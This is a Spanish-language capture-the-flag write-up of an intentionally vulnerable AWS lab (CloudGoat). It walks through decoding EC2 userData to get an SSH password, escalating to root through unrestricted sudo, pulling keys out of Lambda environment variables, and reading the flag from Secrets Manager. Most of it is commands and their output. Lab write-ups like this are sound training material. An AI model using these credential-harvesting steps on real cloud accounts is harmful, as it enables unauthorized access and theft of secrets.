---
title: Data Secrets - Easy (HS)
permalink: /Data-Secrets-HS-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
tags:
  - api
  - cloud
  - dns
  - nmap
  - ssh
  - sudo-abuse
  - web
---
---
# Recon

```bash 
[Apr 14, 2026 - 01:18:50 (-03)] exegol-test Data # nmapf 10.1.46.187
Nmap Full scan in progress
Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-14 01:18 -03
Initiating Ping Scan at 01:18
Scanning 10.1.46.187 [4 ports]
Completed Ping Scan at 01:18, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:18
Completed Parallel DNS resolution of 1 host. at 01:18, 0.02s elapsed
Initiating SYN Stealth Scan at 01:18
Scanning 10.1.46.187 [65535 ports]
Discovered open port 22/tcp on 10.1.46.187
Discovered open port 8000/tcp on 10.1.46.187
Completed SYN Stealth Scan at 01:19, 6.98s elapsed (65535 total ports)
Nmap scan report for 10.1.46.187
Host is up, received reset ttl 63 (0.16s latency).
Scanned at 2026-04-14 01:18:54 -03 for 7s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds
           Raw packets sent: 68067 (2.995MB) | Rcvd: 67900 (2.716MB)
nmapf:7: command not found: ep
```

Después de iniciar el entorno de acuerdo a la introducción de la maquina, puedo ver ambas `keys`

![[Pasted image 20260414012150.png]]
### Config Profile

Con ambas, configure un usuario `cloudgoat`.

```bash
Data # aws configure --profile cloudgoat
AWS Access Key ID [None]: AKIAREDACTED00000000
AWS Secret Access Key [None]: REDACTED_AWS_SECRET_KEY
Default region name [None]:
Default output format [None]:
```

### Reveal user

Para saber que usuario soy en AWS puedo usar el siguiente comando indicando mi perfil configurado.

```bash
aws sts get-caller-identity --profile cloudgoat
```

![[Pasted image 20260414012741.png]]
### Set region

Primero antes que nada como no lo hice antes, setee una region:

```bash
aws configure set region us-east-1 --profile cloudgoat
```
### Manual instance enumeration
#### EC2 Instances

Busque instancias siguiendo este enlace de [HackTricks](cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/index.html), para poder enumerar el ID de alguna instancia activa, viendo el siguiente `ID` y su `IP Publica`

```bash
aws ec2 describe-instances --profile cloudgoat --query "Reservations[*].Instances[*].{ID:InstanceId,State:State.Name,PublicIP:PublicIpAddress}"

[
    [
        {
            "ID": "i-02ef32166e3dd8752",
            "State": "running",
            "PublicIP": "3.87.38.247"
        }
    ]
]
```

Usando el mismo, puedo enumerar los atributos `userData`. Donde a menudo los administradores dejan scripts de configuración con contraseñas, llaves API o secretos de Git ahí.

```bash
aws ec2 describe-instance-attribute --instance-id i-02ef32166e3dd8752 --attribute userData --profile cloudgoat --region us-east-1

{
    "InstanceId": "i-02ef32166e3dd8752",
    "UserData": {
        "Value": "IyEvYmluL2Jhc2gKZWNobyAiZWMyLXVzZXI6Q2xvdWRHb2F0SW5zdGFuY2VQYXNzd29yZCEiIHwgY2hwYXNzd2QKc2VkIC1pICdzL1Bhc3N3b3JkQXV0aGVudGljYXRpb24gbm8vUGFzc3dvcmRBdXRoZW50aWNhdGlvbiB5ZXMvZycgL2V0Yy9zc2gvc3NoZF9jb25maWcKc2VydmljZSBzc2hkIHJlc3RhcnQK"
    }
}
```
## Shell as ec2-user

#### Decode 

La cadena resultante la decodifique en base64 lo que me dio las credenciales del usuario `ec2-user`.

```bash
echo IyEvYmluL2Jhc2gKZWNobyAiZWMyLXVzZXI6Q2xvdWRHb2F0SW5zdGFuY2VQYXNzd29yZCEiIHwgY2hwYXNzd2QKc2VkIC1pICdzL1Bhc3N3b3JkQXV0aGVudGljYXRpb24gbm8vUGFzc3dvcmRBdXRoZW50aWNhdGlvbiB5ZXMvZycgL2V0Yy9zc2gvc3NoZF9jb25maWcKc2VydmljZSBzc2hkIHJlc3RhcnQK | base64 -d
#!/bin/bash
echo "ec2-user:CloudGoatInstancePassword!" | chpasswd
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
service sshd restart
```
### Automatization

De la forma automatizada, la misma enumeracion se puede usar el siguiente bucle

```bash
for instanceid in $(aws ec2 describe-instances --profile cloudgoat --region us-east-1 | grep -Eo '"i-[a-zA-Z0-9]+' | tr -d '"'); do
  echo "Instance ID: $instanceid"
  aws ec2 describe-instance-attribute --profile cloudgoat --region us-east-1 --instance-id "$instanceid" --attribute userData | jq ".UserData.Value" | tr -d '"' | base64 -d
  echo ""
  echo "-------------------"
done
Instance ID: i-02ef32166e3dd8752
#!/bin/bash
echo "ec2-user:CloudGoatInstancePassword!" | chpasswd
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
service sshd restart

-------------------
```
### Shell

Usando estas credenciales me conecte a la `IP` publica.

```bash
ssh ec2-user@3.87.38.247
The authenticity of host '3.87.38.247 (3.87.38.247)' can't be established.
ED25519 key fingerprint is SHA256:o3jWgZY2aMAbzpiZctvr/p0ck0q5dhmLLmDbKYTGn+s.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '3.87.38.247' (ED25519) to the list of known hosts.
ec2-user@3.87.38.247's password:
   ,     #_
   ~\_  ####_        Amazon Linux 2
  ~~  \_#####\
  ~~     \###|       AL2 End of Life is 2026-06-30.
  ~~       \#/ ___
   ~~       V~' '->
    ~~~         /    A newer version of Amazon Linux is available!
      ~~._.   _/
         _/ _/       Amazon Linux 2023, GA and supported until 2028-03-15.
       _/m/'           https://aws.amazon.com/linux/amazon-linux-2023/

[ec2-user@ip-10-0-1-7 ~]$
```
## Shell as root
### Sudo privileges

Viendo los privilegios del usuario, vi que tiene la capacidad de ejecutar cualquier comando como `root`.

```bash
[ec2-user@ip-10-0-1-7 ~]$ sudo -l
Matching Defaults entries for ec2-user on ip-10-0-1-7:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY
    HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User ec2-user may run the following commands on ip-10-0-1-7:
    (ALL) ALL
    (ALL) NOPASSWD: ALL
```

Por lo que me converti en el mismo usando el `-i`.

```bash
[ec2-user@ip-10-0-1-7 ~]$ sudo -i
[root@ip-10-0-1-7 ~]# id
uid=0(root) gid=0(root) groups=0(root)
```
### Lambda Unauth enumeration

Como `aws` esta tambien instalado en la maquina liste las funciones de `lambda`, viendo asi otro par de `keys`.

```bash
[root@ip-10-0-1-7 ec2-user]# aws lambda list-functions --region us-east-1
{
    "Functions": [
        {
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "Version": "$LATEST",
            "CodeSha256": "J7+tACeZu8267g5XEXe/iTlv1Ip9wdtOr/IzHK/W9fc=",
            "FunctionName": "cg-lambda-function-cgid7efktqazle",
            "MemorySize": 128,
            "RevisionId": "08b48647-ffe8-40ff-821e-46e18d289797",
            "CodeSize": 221,
            "FunctionArn": "arn:aws:lambda:us-east-1:703671921227:function:cg-lambda-function-cgid7efktqazle",
            "Environment": {
                "Variables": {
                    "DB_USER_SECRET_KEY": "REDACTED_AWS_SECRET_KEY_2",
                    "DB_USER_ACCESS_KEY": "AKIAREDACTED11111111"
                }
            },
            "Handler": "lambda_function.lambda_handler",
            "Role": "arn:aws:iam::703671921227:role/cg-lambda-exec-role-cgid7efktqazle",
            "Timeout": 3,
            "LastModified": "2026-04-14T04:20:56.058+0000",
            "Runtime": "python3.9",
            "Description": ""
        }
    ]
}
```
### Secrets Manager enumeration

Configure las mismas usando las variables de AWS en este caso para variar.

```bash
[root@ip-10-0-1-7 ec2-user]# export AWS_ACCESS_KEY_ID="AKIAREDACTED11111111"
[root@ip-10-0-1-7 ec2-user]# export AWS_SECRET_ACCESS_KEY="REDACTED_AWS_SECRET_KEY_2"
[root@ip-10-0-1-7 ec2-user]# export AWS_DEFAULT_REGION="us-east-1"
```

Ademas usando [este mismo enlace](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-secrets-manager-enum.html#aws-secrets-manager) de la misma pagina enumere el `Secrets Manager`, viendo asi su `id`.

```bash
[root@ip-10-0-1-7 ec2-user]# aws secretsmanager get-secret-value --secret-id cg-secret-cgid7efktqazle

An error occurred (ResourceNotFoundException) when calling the GetSecretValue operation: Secrets Manager can't find the specified secret.
[root@ip-10-0-1-7 ec2-user]# aws secretsmanager list-secrets
{
    "SecretList": [
        {
            "Name": "cg-final-flag-cgid7efktqazle",
            "Tags": [
                {
                    "Value": "CloudGoat",
                    "Key": "Stack"
                },
                {
                    "Value": "scenario_template",
                    "Key": "Scenario"
                },
                {
                    "Value": "cg-final-flag-cgid7efktqazle",
                    "Key": "Name"
                }
            ],
            "LastChangedDate": 1776140447.427,
            "SecretVersionsToStages": {
                "terraform-20260414042047390400000002": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": 1776140447.265,
            "LastAccessedDate": 1776124800.0,
            "ARN": "arn:aws:secretsmanager:us-east-1:703671921227:secret:cg-final-flag-cgid7efktqazle-whtq0K",
            "Description": "The final flag for the CloudGoat scenario"
        }
    ]
}
```
### Flag

Con el uso de la función `get-secret-value`, obtuve el contenido del mismo.

```bash
[root@ip-10-0-1-7 ec2-user]# aws secretsmanager get-secret-value --secret-id cg-final-flag-cgid7efktqazle
{
    "Name": "cg-final-flag-cgid7efktqazle",
    "VersionId": "terraform-20260414042047390400000002",
    "SecretString": "{\"flag\":\"d4t4_s3cr3ts_4r3_fun\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1776140447.422,
    "ARN": "arn:aws:secretsmanager:us-east-1:703671921227:secret:cg-final-flag-cgid7efktqazle-whtq0K"
}
```

`~Happy Hacking.`

